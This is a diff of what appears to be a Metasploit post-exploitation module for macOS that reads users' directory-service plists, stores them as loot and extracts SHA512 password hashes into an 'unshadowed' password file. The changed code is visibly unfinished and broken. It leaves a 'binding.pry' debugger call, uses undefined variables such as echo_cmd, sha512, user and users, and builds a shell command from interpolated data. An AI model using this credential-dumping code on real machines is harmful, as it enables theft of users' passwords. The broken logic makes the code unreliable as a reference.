@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'rex'
 require 'msf/core/auxiliary/report'
-
+require 'active_support/core_ext/hash/conversions'
 
 class Metasploit3 < Msf::Post
 
@@ -95,8 +95,6 @@ class Metasploit3 < Msf::Post
   # Dump SHA1 Hashes used by OSX, must be root to get the Hashes
   def dump_hash
     print_status("Dumping Hashes")
-    users = []
-    nt_hash = nil
     host = session.session_host
 
     # Path to files with hashes
@@ -104,20 +102,21 @@ class Metasploit3 < Msf::Post
 
     # Check if system is Lion if not continue
     if ver_num =~ /10\.(\d+)/ and $1.to_i >= 7
-
       hash_decoded = ""
 
       # get list of profiles present in the box
       profiles = cmd_exec("ls /private/var/db/dslocal/nodes/Default/users").split("\n")
 
       if profiles
-        profiles.each do |p|
+        profiles.each do |profile|
           # Skip none user profiles
-          next if p =~ /^_/
-          next if p =~ /^daemon|root|nobody/
+          next if profile =~ /^_/
+          next if profile =~ /^daemon|nobody/
 
           # Turn profile plist in to XML format
-          plist = "/private/var/db/dslocal/nodes/Default/users/#{p.chomp}"
+          plist = "/private/var/db/dslocal/nodes/Default/users/#{profile.chomp}"
+          store_loot("osx.users.#{profile}", "text/plain", session, read_file(plist), "#{profile}.plist")
+
           data = cmd_exec("defaults read #{plist} ShadowHashData")
 
           if data.gsub(/\s+/, '') =~ /\(<(.+)>\)/
@@ -126,25 +125,13 @@ class Metasploit3 < Msf::Post
             next
           end
 
-          # Extract the shadow hash data, decode it and format it
-          data.unpack('m')[0].each_byte do |b|
-            hash_decoded << sprintf("%02X", b)
-          end
-          user = File.basename(p, '.*')
-
-          # Check if NT HASH is present
-          if hash_decoded =~ /4F1010/
-            nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0]
-          end
+          data.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
+          shadow = cmd_exec("/bin/sh -c echo -ne \"#{echo_cmd}\" | plutil -convert xml1 - -o -")
+          # h = Hash.from_xml(data)
           require 'pry'; binding.pry
-          # Carve out the SHA512 Hash, the first 4 bytes is the salt
-          sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
 
-          print_status("SHA512:#{user}:#{sha512}")
-          sha1_file << "#{user}:#{sha512}\n"
-
-          # Reset hash value
-          sha512 = ""
+          print_status("SHA512:#{profile}:#{sha512}")
+          sha1_file << "#{profile}:#{sha512}\n"
 
           if nt_hash
             print_status("NT:#{user}:#{nt_hash}")
@@ -167,18 +154,11 @@ class Metasploit3 < Msf::Post
       end
       # Save pwd file
       upassf = store_loot("osx.hashes.sha512", "text/plain", session, sha1_file, "unshadowed_passwd.pwd", "OSX Unshadowed SHA512 Password File")
-      print_good("Unshadowed Password File: #{upassf}")
 
       # If system was lion and it was processed nothing more to do
       return
     end
 
-    users_folder = cmd_exec("/bin/ls", "/Users")
-
-    users_folder.each_line do |u|
-      next if u.chomp =~ /Shared|\.localized/
-      users << u.chomp
-    end
     # Process each user
     users.each do |user|
       if leopard?
